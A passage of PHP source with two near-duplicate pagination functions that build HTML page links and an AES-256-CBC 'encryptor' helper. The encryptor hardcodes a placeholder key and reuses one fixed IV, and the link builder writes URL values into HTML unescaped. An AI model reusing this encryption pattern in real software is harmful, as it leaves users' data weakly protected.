				$pagination .= "margin: $margin;";
			if($padding)
				$pagination .= "padding: $padding;";
			$pagination .= "\"";
		}
		$pagination .= ">";

		//previous button
		if ($page > 1) 
			$pagination .= "<a href=\"$targetpage$pagestring$prev\"><< Prev</a>";
		else
			$pagination .= "<span class=\"disabled\"><< Prev</span>";	
		
		//pages	
		if ($lastpage < 7 + ($adjacents * 2))	//not enough pages to bother breaking it up
		{	
			for ($counter = 1; $counter <= $lastpage; $counter++)
			{
				if ($counter == $page)
					$pagination .= "<span class=\"current\">$counter</span>";
				else
					$pagination .= "<a href=\"" . $targetpage . $pagestring . $counter . "\">$counter</a>";					
			}
		}
		elseif($lastpage >= 7 + ($adjacents * 2))	//enough pages to hide some
		{
			//close to beginning; only hide later pages
			if($page < 1 + ($adjacents * 3))		
			{
				for ($counter = 1; $counter < 4 + ($adjacents * 2); $counter++)
				{
					if ($counter == $page)
						$pagination .= "<span class=\"current\">$counter</span>";
					else
						$pagination .= "<a href=\"" . $targetpage . $pagestring . $counter . "\">$counter</a>";					
				}
				$pagination .= "<span class=\"elipses\">...</span>";
				$pagination .= "<a href=\"" . $targetpage . $pagestring . $lpm1 . "\">$lpm1</a>";
				$pagination .= "<a href=\"" . $targetpage . $pagestring . $lastpage . "\">$lastpage</a>";		
			}
			//in middle; hide some front and some back
			elseif($lastpage - ($adjacents * 2) > $page && $page > ($adjacents * 2))
			{
				$pagination .= "<a href=\"" . $targetpage . $pagestring . "1\">1</a>";
				$pagination .= "<a href=\"" . $targetpage . $pagestring . "2\">2</a>";
				$pagination .= "<span class=\"elipses\">...</span>";
				for ($counter = $page - $adjacents; $counter <= $page + $adjacents; $counter++)
				{
					if ($counter == $page)
						$pagination .= "<span class=\"current\">$counter</span>";
					else
						$pagination .= "<a href=\"" . $targetpage . $pagestring . $counter . "\">$counter</a>";					
				}
				$pagination .= "...";
				$pagination .= "<a href=\"" . $targetpage . $pagestring . $lpm1 . "\">$lpm1</a>";
				$pagination .= "<a href=\"" . $targetpage . $pagestring . $lastpage . "\">$lastpage</a>";		
			}
			//close to end; only hide early pages
			else
			{
				$pagination .= "<a href=\"" . $targetpage . $pagestring . "1\">1</a>";
				$pagination .= "<a href=\"" . $targetpage . $pagestring . "2\">2</a>";
				$pagination .= "<span class=\"elipses\">...</span>";
				for ($counter = $lastpage - (1 + ($adjacents * 3)); $counter <= $lastpage; $counter++)
				{
					if ($counter == $page)
						$pagination .= "<span class=\"current\">$counter</span>";
					else
						$pagination .= "<a href=\"" . $targetpage . $pagestring . $counter . "\">$counter</a>";					
				}
			}
		}
		
		//next button
		if ($page < $counter - 1) 
			$pagination .= "<a href=\"" . $targetpage . $pagestring . $next . "\">Next >></a>";
		else
			$pagination .= "<span class=\"disabled\">Next >></span>";
		$pagination .= "</div>\n";
	}
	
	return $pagination;
	

}
function getPaginationStringForBackEnd($page = 10, $totalitems, $limit, $adjacents = 1, $targetpage,  $pagestring = "?page=" )
{	

	//defaults
	if(!$adjacents) $adjacents = 1;
	if(!$limit) $limit = 2;
	if(!$page) $page = 1;
	if(!$targetpage) $targetpage = "/";
	
	//other vars
	$prev = $page - 1;									//previous page is page - 1
	$next = $page + 1;									//next page is page + 1
	$lastpage = ceil($totalitems / $limit);				//lastpage is = total items / items per page, rounded up.
	$lpm1 = $lastpage - 1;								//last page minus 1
	
	/* 
		Now we apply our rules and draw the pagination object. 
		We're actually saving the code to a variable in case we want to draw it more than once.
	*/
	$pagination = "";
	if($lastpage > 1)
	{	
	
		$pagination .= "<div class=\"pagination\"";
		if($margin || $padding)
		{
			$pagination .= " style=\"";
			if($margin)
				$pagination .= "margin: $margin;";
			if($padding)
				$pagination .= "padding: $padding;";
			$pagination .= "\"";
		}
		$pagination .= ">";

		//previous button
		if ($page > 1) 
			$pagination .= "<a href=\"$targetpage$pagestring$prev\"><< Prev</a>";
		else
			$pagination .= "<span class=\"disabled\"><< Prev</span>";	
		
		//pages	
		if ($lastpage < 7 + ($adjacents * 2))	//not enough pages to bother breaking it up
		{	
			for ($counter = 1; $counter <= $lastpage; $counter++)
			{
				if ($counter == $page)
					$pagination .= "<span class=\"current\">$counter</span>";
				else
					$pagination .= "<a href=\"" . $targetpage . $pagestring . $counter . "\">$counter</a>";					
			}
		}
		elseif($lastpage >= 7 + ($adjacents * 2))	//enough pages to hide some
		{
			//close to beginning; only hide later pages
			if($page < 1 + ($adjacents * 3))		
			{
				for ($counter = 1; $counter < 4 + ($adjacents * 2); $counter++)
				{
					if ($counter == $page)
						$pagination .= "<span class=\"current\">$counter</span>";
					else
						$pagination .= "<a href=\"" . $targetpage . $pagestring . $counter . "\">$counter</a>";					
				}
				$pagination .= "<span class=\"elipses\">...</span>";
				$pagination .= "<a href=\"" . $targetpage . $pagestring . $lpm1 . "\">$lpm1</a>";
				$pagination .= "<a href=\"" . $targetpage . $pagestring . $lastpage . "\">$lastpage</a>";		
			}
			//in middle; hide some front and some back
			elseif($lastpage - ($adjacents * 2) > $page && $page > ($adjacents * 2))
			{
				$pagination .= "<a href=\"" . $targetpage . $pagestring . "1\">1</a>";
				$pagination .= "<a href=\"" . $targetpage . $pagestring . "2\">2</a>";
				$pagination .= "<span class=\"elipses\">...</span>";
				for ($counter = $page - $adjacents; $counter <= $page + $adjacents; $counter++)
				{
					if ($counter == $page)
						$pagination .= "<span class=\"current\">$counter</span>";
					else
						$pagination .= "<a href=\"" . $targetpage . $pagestring . $counter . "\">$counter</a>";					
				}
				$pagination .= "...";
				$pagination .= "<a href=\"" . $targetpage . $pagestring . $lpm1 . "\">$lpm1</a>";
				$pagination .= "<a href=\"" . $targetpage . $pagestring . $lastpage . "\">$lastpage</a>";		
			}
			//close to end; only hide early pages
			else
			{
				$pagination .= "<a href=\"" . $targetpage . $pagestring . "1\">1</a>";
				$pagination .= "<a href=\"" . $targetpage . $pagestring . "2\">2</a>";
				$pagination .= "<span class=\"elipses\">...</span>";
				for ($counter = $lastpage - (1 + ($adjacents * 3)); $counter <= $lastpage; $counter++)
				{
					if ($counter == $page)
						$pagination .= "<span class=\"current\">$counter</span>";
					else
						$pagination .= "<a href=\"" . $targetpage . $pagestring . $counter . "\">$counter</a>";					
				}
			}
		}
		
		//next button
		if ($page < $counter - 1) 
			$pagination .= "<a href=\"" . $targetpage . $pagestring . $next . "\">Next >></a>";
		else
			$pagination .= "<span class=\"disabled\">Next >></span>";
		$pagination .= "</div>\n";
	}
	
	return $pagination;
	

}
function encryptor($action, $string) {
    $output = false;

    $encrypt_method = "AES-256-CBC";
    //pls set your unique hashing key
    $secret_key = '!@##!#%$#%';
    $secret_iv = '^%@#$&^&';

    // hash
    $key = hash('sha256', $secret_key);

    // iv - encrypt method AES-256-CBC expects 16 bytes - else you will get a warning
    $iv = substr(hash('sha256', $secret_iv), 0, 16);

    //do the encyption given text/string/number
    if( $action == 'encrypt' ) {
        $output = openssl_encrypt($string, $encrypt_method, $key, 0, $iv);
        $output = base64_encode($output);
    }
    else if( $action == 'decrypt' ){
    	//decrypt the given text/string/number
        $output = openssl_decrypt(base64_decode($string), $encrypt_method, $key, 0, $iv);
    }

    return $output;
}


?>
